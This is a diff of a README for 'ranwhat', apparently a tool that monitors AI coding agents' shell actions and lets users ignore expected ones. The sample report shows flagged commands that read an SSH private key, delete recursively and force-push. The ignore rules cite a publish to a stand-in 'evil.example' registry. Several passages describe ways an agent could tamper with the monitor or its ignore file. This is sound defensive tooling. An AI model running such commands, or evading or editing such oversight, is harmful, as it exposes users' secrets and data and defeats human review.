@@ -20,22 +20,22 @@ $ ranwhat watch --days 90
 
   2 critical  2 high
 
-  * Credential material accessed   2026-09-30 18:13:00  Bash
+  * Credential material accessed   2026-09-30 18:13:00  Bash  9c41e07b2d5a8f13
       cat ~/.ssh/id_rsa
       -> The agent read a file whose only purpose is to hold secrets. Whatever
          it read is now in a model context you do not control.
 
-  * Bulk or recursive deletion   2026-09-28 14:42:00  Bash
+  * Bulk or recursive deletion   2026-09-28 14:42:00  Bash  51e3c6a43e946bf5
       …rm -rf '@'
       -> Recursive deletion. Recoverable only if something else was backing it
          up.
 
-  * Package or release published   2026-09-21 11:05:00  Bash
+  * Package or release published   2026-09-21 11:05:00  Bash  3fa9c2d81b7e4a06
       npm publish
       -> Something was pushed to a registry other people may install from.
          Supply-chain reach, and usually irreversible.
 
-  * Destructive git operation   2026-09-15 17:30:00  Bash
+  * Destructive git operation   2026-09-15 17:30:00  Bash  e181acd29cf199ab
       git push --force origin main
       -> History rewriting or branch deletion. This is the class of action
          that destroys the record of what else happened.
@@ -187,12 +187,110 @@ ranwhat sources                             # every agent, where it looked, what
 `--root` and `--state-dir` still work, as the names of
 `--path claude-code=` and `--path openclaw=`.
 
-With `--json`, each action has an `id`: 16 characters, the same on every
-run over the same history, and new for a call run again or flagged for
+Each action ends with its `id`: 16 characters, the same on every run
+over the same history, and new for a call run again or flagged for
 something more. A call read more than once with no time of its own (two
-sessions holding it, or an OpenClaw call run again) is one action, with
-the id of each copy in `ids`. `cwd` is the directory it ran in, when the
-agent wrote one down.
+sessions holding it, or an OpenClaw call run again) is one action. With
+`--json`, each action has its `id`, the id of each copy in `ids` where
+there is more than one, and `cwd`, the directory it ran in, when the
+agent wrote one down. An action you expected is left out of later
+reports with [`ranwhat ignore`](#ranwhat-ignore-leave-out-what-you-expected).
+
+### `ranwhat ignore`: leave out what you expected
+
+A report that lists the same expected actions on every run stops being
+read. `ranwhat ignore` names what to leave out, by the id at the end of
+each action's line:
+
+```bash
+ranwhat ignore 3fa9c2d81b7e4a06   # that action, or on a terminal, every one like it
+ranwhat ignore all                # everything listed now: later runs list only what is new
+ranwhat ignore                    # what the file leaves out, line by line
+```
+
+On a terminal, `ranwhat ignore ID` asks whether to leave out that action
+alone or every action like it: the same command, word for word, run in
+the same folder or below it, and for a critical one until a date a year
+away. `--no-interactive` adds the id without asking.
+
+Both write `~/.ranwhat/ignore` (`$RANWHAT_HOME/ignore`), mode 0600, a
+plain-text file you can read and edit. One entry a line, and `#` after a
+blank starts a comment:
+
+```
+publish 'npm publish' in=~/work/mylib until=2027-01-31       # mylib releases
+persist 'sudo systemctl enable docker'                        # docker at boot here
+git.destructive 'git push --force origin gh-pages'
+cred.read ~/work/mylib/.env.test until=2027-04-01             # fixture values only
+exec.remote                                                   # medium and high only
+3fa9c2d81b7e4a06  # publish 'npm publish' in=~/work/mylib  (Claude Code, 2026-09-21 11:05)
+```
+
+- An id leaves out that action. Several on a line are the copies of one
+  call, as watch's `ids` lists them.
+- `RULE 'COMMAND'` leaves out every action the rule flags whose command is
+  COMMAND, word for word. It is matched against the whole command the
+  action ran, not the evidence printed: `npm publish --registry
+  https://registry.npmjs.evil.example/` is not `npm publish`, and `sudo npm
+  publish` is not either. A `*` stands for any run of characters within one
+  word. When the rule flagged a file a tool read or wrote, a path stands in
+  for the command. With no command, every action the rule flags.
+- `in=DIR` leaves out only what ran in DIR or below it, following a `cd`
+  earlier in the same call; `until=YYYY-MM-DD` is the last day it applies.
+- A line ranwhat cannot read is skipped, named in every report, and leaves
+  nothing out. `ranwhat ignore` exits 3 when one is.
+
+`--ignore PATH` makes check, watch and ignore use another file, such as a
+repository's `.ranwhatignore`. ranwhat never picks one up from the working
+tree on its own, which is what an agent writes most easily, and no variable
+points at one, so a cron job and your terminal read the same file.
+
+What is never left out:
+
+- A secret. `clean` masks it, or keeps it in its review; an action that
+  holds one stays listed until then.
+- A critical action, but by its id, or by an entry that names its program
+  in full, with `in=` and an `until=` no more than 400 days ahead. The
+  report says when an entry matches a critical action and lacks those.
+- A change an agent made to what ranwhat reports (this file, the values
+  `clean` was told to keep, the key, where ranwhat keeps them, or `ranwhat
+  ignore` itself), until you acknowledge it on a terminal with `ranwhat
+  ignore ID`, which writes the id with `ack`.
+- What a call decoded from base64 or the like, but by its id.
+
+Every report says how many actions the file left out, and by which line:
+under the report, on stderr with `watch --json`, and as `"ignored"` in
+`check --json`. `--no-ignore` lists them all again, each marked with the
+line that would leave it out. `--fail-on` counts only what is listed, and
+says how many at or above it were left out. A SARIF log leaves them out
+too, which closes their alerts in code scanning. The hook does not read the
+ignore file: what you ignore is left out of reports, and the hook still
+asks.
+
+**Only what is new.** `ranwhat ignore all` writes the id of every action
+listed now, in one dated block. Give it the `--days` you run watch with: a
+later `--days 365` lists older actions it never saw. `ranwhat ignore -`
+reads the ids from `watch --json` or `check --json` on stdin, so a cron job
+alerts on each new action once:
+
+```bash
+ranwhat ignore all --days 30                      # once: what is there now is known
+# hourly:
+ranwhat watch --days 30 --fail-on high --json > ~/ranwhat-new.json 2> ~/ranwhat-notes.txt
+[ $? -eq 3 ] && mail -s "ranwhat: new actions" me < ~/ranwhat-new.json
+ranwhat ignore - < ~/ranwhat-new.json             # each new action alerts once
+```
+
+A change to ranwhat's own settings is never added by `ignore all` or
+`ignore -`, so it alerts on every run until you acknowledge it.
+
+watch and the hook judge what a call shows, so a script that rewrites the
+file is not seen. An id changes when a later ranwhat flags a call for
+something more, or rates it otherwise, and the action is listed once more:
+run `ranwhat ignore all` again after an upgrade for a fresh baseline. The
+comment ranwhat writes after each id holds the command, masked as the
+report masks it, and where it ran; read a `.ranwhatignore` before you
+commit it.
 
 ### `ranwhat clean`: find secrets in Claude Code and other agents' transcripts
 
@@ -384,11 +482,24 @@ steps:
       # upload-sarif: "true"
       # sarif-file: ranwhat.sarif
       # allow-empty: "false"           # "true" passes when there is no history
+      # ignore-file: .ranwhatignore    # what to leave out, as committed at the base
 ```
 
 The step fails with ranwhat's exit status, which is also its `exit-code`
 output: 3 for findings at or above `fail-on`, 2 when there was no agent
 history to read (unless `allow-empty`), 1 on an error.
+
+`ignore-file` names a [`ranwhat ignore`](#ranwhat-ignore-leave-out-what-you-expected)
+file in the repository. The Action reads it as it was committed at the pull
+request's base, or before the push, never as the job left it: neither a step
+that ran an agent nor the pull request itself can widen it, and it warns
+when the job changed it. Without the input nothing is left out, and the
+runner's own `~/.ranwhat/ignore` is never read. `args: --ignore PATH` reads
+a file as it is instead. On a self-hosted runner whose agent history
+persists, build the file with `ranwhat ignore all --ignore .ranwhatignore`,
+read it (its comments hold commands, masked), commit it, and give it an
+owner in CODEOWNERS; a pull request job that runs `ranwhat ignore --ignore
+.ranwhatignore` fails with exit status 3 on a line ranwhat cannot read.
 
 ### `ranwhat scan`: score what an agent's credentials can do
 
@@ -517,6 +628,8 @@ ranwhat hook uninstall
   `RANWHAT_HOME=/tmp/x ranwhat watch`, which changes that run alone. A
   state folder set with `RANWHAT_HOME` to a path without the word ranwhat in
   it is recognised in a file tool's path, and not in a shell command.
+- The hook does not read the ignore file: what you ignore is left out of
+  reports, and the hook still asks.
 - Each check takes about a fifth of a second. The reason it gives Claude
   Code names the rule, never the value that tripped it.
 
@@ -607,6 +720,8 @@ prints a warning saying why it shouldn't.
 
 Reports are written mode `600` and never through a symlink: a report maps an
 agent's entire authority surface, which is useful to somebody other than you.
+The ignore file, `~/.ranwhat/ignore`, is written mode `600` as well, whole and
+under a lock; a file other users can write is not used.
 
 ranwhat keeps two secrets of its own, each mode `600`: its account token,
 `~/.ranwhat/token`, and `~/.ranwhat/known/key`, the key the secrets index
